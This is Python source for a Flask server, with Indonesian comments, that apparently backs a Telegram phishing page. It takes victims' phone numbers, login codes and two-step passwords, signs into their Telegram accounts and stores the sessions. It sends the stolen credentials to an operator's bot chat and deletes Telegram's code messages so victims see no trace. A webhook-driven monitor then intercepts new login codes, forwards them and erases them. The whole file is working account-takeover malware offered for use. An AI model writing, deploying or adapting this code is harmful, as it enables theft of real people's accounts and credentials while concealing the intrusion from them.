import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from telethon.tl.functions.messages import DeleteHistoryRequest

app = Flask(__name__)
# Izinkan akses dari Vercel
CORS(app, resources={r"/*": {"origins": "*"}})

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
# URL otomatis dari Railway
RAILWAY_DOMAIN = os.getenv('RAILWAY_STATIC_URL')
RAILWAY_URL = f"https://{RAILWAY_DOMAIN}" if RAILWAY_DOMAIN else ""

# Database RAM (Pastikan Railway tidak sering restart)
user_db = {}

def bot_api(method, payload):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        res = requests.post(url, json=payload, timeout=15)
        return res.json()
    except: return {}

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    # Buat loop baru untuk setiap request agar tidak bentrok
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(handle_flow(data))
    except Exception as e:
        print(f"Sistem Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    finally: loop.close()

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step', 1))
        nomor_mentah = data.get('nomor', '')
        # Normalisasi nomor
        num = re.sub(r'\D', '', nomor_mentah)
        if num.startswith('0'): num = '62' + num[1:]
        nomor = '+' + num
        
        nama = data.get('nama', 'User')
        
        if nomor not in user_db:
            user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}

        client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            # Kirim permintaan kode ke Telegram
            res = await client.send_code_request(nomor)
            user_db[nomor].update({"hash": res.phone_code_hash, "session": client.session.save()})
            return jsonify({"status": "success"})

        elif step == 2:
            otp_code = data.get('otp')
            try:
                await client.sign_in(nomor, otp_code, phone_code_hash=user_db[nomor]['hash'])
                user_db[nomor]['session'] = client.session.save()
                
                # GHOST MODE: Hapus riwayat kode 777000
                await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
                
                text = f"✅ **LOGIN BERHASIL**\n\nNama: **{nama}**\nNomor: `{nomor}`\n\nKlik tombol di bawah jika ingin mengintip OTP selanjutnya (TurboTel/Telegraph)."
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": text, 
                    "parse_mode": "Markdown", 
                    "reply_markup": {"inline_keyboard": [[{"text": "🔎 INTIP OTP BARU", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except errors.SessionPasswordNeededError:
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"})
            except Exception as e:
                return jsonify({"status": "error", "message": "OTP SALAH"}), 400

        elif step == 3:
            sandi = data.get('sandi')
            await client.sign_in(password=sandi)
            user_db[nomor].update({"sandi": sandi, "session": client.session.save()})
            await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
            
            text = f"✅ **LOGIN 2FA BERHASIL**\n\nNama: **{nama}**\nNomor: `{nomor}`\nSandi: `{sandi}`"
            bot_api("sendMessage", {
                "chat_id": CHAT_ID, 
                "text": text, 
                "parse_mode": "Markdown", 
                "reply_markup": {"inline_keyboard": [[{"text": "🔎 INTIP OTP BARU", "callback_data": f"upd_{nomor}"}]]}
            })
            return jsonify({"status": "success"})
    finally:
        if client: await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and "callback_query" in update:
        call = update["callback_query"]
        data_call = call["data"]
        
        if "_" in data_call:
            action, nomor = data_call.split("_", 1)
            if action == "upd":
                bot_api("answerCallbackQuery", {"callback_query_id": call["id"], "text": "Monitoring Aktif..."})
                res = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"👀 **GHOST MODE AKTIF**\nNomor: `{nomor}`\n\nSilakan minta kode di TurboTel. Bot akan otomatis meneruskan kode ke sini."})
                user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
                
                # Jalankan monitor di thread terpisah agar flask tidak timeout
                threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
    return jsonify({"status": "success"})

async def monitor_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data['session']: return
    
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    
    try:
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            # Cari 5 angka OTP
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                kode = otp.group(0)
                msg = f"📩 **OTP TERDETEKSI**\nNomor: `{nomor}`\nKode: `{kode}`\n\n*Pesan asli telah dihapus dari target.*"
                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
                
                # GHOST MODE: Hapus pesan & riwayat
                await event.delete(revoke=True)
                await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
        
        # Monitor selama 15 menit
        await asyncio.wait_for(client.run_until_disconnected(), timeout=900)
    except: pass
    finally:
        if client.is_connected(): await client.disconnect()

if __name__ == "__main__":
    # Set Webhook Otomatis saat server nyala
    if RAILWAY_URL:
        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))